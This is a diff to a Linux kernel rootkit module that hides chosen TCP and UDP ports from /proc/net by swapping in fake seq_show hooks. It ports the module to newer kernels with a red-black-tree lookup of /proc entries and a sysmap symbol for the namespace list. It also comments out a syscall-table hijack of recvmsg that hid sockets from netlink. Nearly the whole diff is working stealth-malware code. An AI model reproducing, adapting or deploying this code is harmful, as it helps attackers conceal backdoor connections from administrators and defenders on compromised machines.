@@ -25,7 +25,7 @@
 #include <net/inet_sock.h>
 
 #include "sysmap.h"
-/* #include "proc_internal.h" */
+#include "proc_internal.h"
 
 #define MAX_HIDE_PORTS 99
 #define SOCKET_STATE_VISIBLE 0
@@ -198,13 +198,39 @@ int fake_udp4_seq_show(struct seq_file *seq, void *v)
 
 struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry* pde, const char* name)
 {
-    struct proc_dir_entry* ret = pde->subdir;
+        struct rb_root *root = &pde->subdir;
+        struct rb_node **new = &root->rb_node, *parent = NULL;
+
+        /* Figure out where to put new node */
+        while (*new) {
+                struct proc_dir_entry *this =
+                        container_of(*new, struct proc_dir_entry, subdir_node);
+                int result; // proc_match(de->namelen, de->name, this);
+if (strlen(name) < this->namelen) result = -1;
+else if (strlen(name) > this->namelen) result = 1;
+else result = memcmp(name, this->name, this->namelen);
+
+                parent = *new;
+                if (result < 0)
+                        new = &(*new)->rb_left;
+                else if (result > 0)
+                        new = &(*new)->rb_right;
+                else
+                        return this;
+        }
+
+printk(KERN_INFO "thing not found BUGBUGBUG\n");
+return NULL;
+/*
+
+    struct proc_dir_entry* ret = rb_entry(pde->subdir.rb_node, struct proc_dir_entry, subdir_node);
     while(ret && strcmp(name, ret->name)) {
         ret = ret->next;
     }
-    return ret;
+    return ret;*/
 }
 
+#if 0
 asmlinkage long fake_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags)
 {
     // Call the real function
@@ -225,7 +251,7 @@ asmlinkage long fake_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags)
         // Copy data from user space to kernel space
         struct msghdr* msg = kmalloc(ret, GFP_KERNEL);
         int err = copy_from_user(msg, umsg, ret);
-        struct nlmsghdr* hdr = msg->msg_iter->iov_base;
+        struct nlmsghdr* hdr = msg->msg_iter.iov_base;
         if (err) {
             return ret; // panic
         }
@@ -261,6 +287,7 @@ asmlinkage long fake_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags)
     }
     return ret;
 }
+#endif
 
 int init_module(void){
 
@@ -272,7 +299,7 @@ int init_module(void){
     }
 
     // Iterate all net namespaces
-    list_for_each_entry(net_ns, &net_namespace_list, list) {
+    list_for_each_entry(net_ns, ((typeof(&net_namespace_list))SM_net_namespace_list), list) {
 
         // Get the corresponding proc entries
         struct proc_dir_entry* pde_net = net_ns->proc_net;
@@ -292,10 +319,12 @@ int init_module(void){
         *udp_hook_fn_ptr = fake_udp4_seq_show;
     }
 
+/*
     disable_ro();
     real_sys_recvmsg = syscalls[__NR_recvmsg];
     syscalls[__NR_recvmsg] = fake_recvmsg;
     enable_ro();
+*/
 
     socket_hiding_state = SOCKET_STATE_HIDDEN;
 
@@ -311,9 +340,11 @@ void cleanup_module(void){
     *tcp_hook_fn_ptr = real_tcp4_seq_show;
     *udp_hook_fn_ptr = real_udp4_seq_show;
 
+/*
     disable_ro();
     syscalls[__NR_recvmsg] = real_sys_recvmsg;
     enable_ro();
+*/
 
     socket_hiding_state = SOCKET_STATE_VISIBLE;
 
